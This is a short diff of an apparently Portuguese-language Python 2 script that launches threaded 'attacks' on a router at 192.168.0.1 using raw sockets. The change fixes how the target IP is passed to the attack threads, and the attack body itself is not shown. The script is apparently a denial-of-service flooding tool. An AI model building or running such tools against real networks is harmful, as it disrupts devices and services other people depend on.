@@ -6,7 +6,7 @@ def show_begin(ip_dest):
     import time
     print 'Iniciando o ataque ao roteador', ip_dest 
 
-def attack(numero_thread, dest_ip): 
+def attack(dest_ip): 
     #create a raw socket
     #import time
 
@@ -132,9 +132,9 @@ i = 0
 
 dest_ip = '192.168.0.1'
 
-ataque2 = Thread(target=attack,args=[6001])
-ataque3 = Thread(target=attack,args=[7002])
-ataque4 = Thread(target=attack,args=[8003])
+ataque2 = Thread(target=attack,args=[dest_ip])
+ataque3 = Thread(target=attack,args=[dest_ip])
+ataque4 = Thread(target=attack,args=[dest_ip])
 		
 
 while 1:
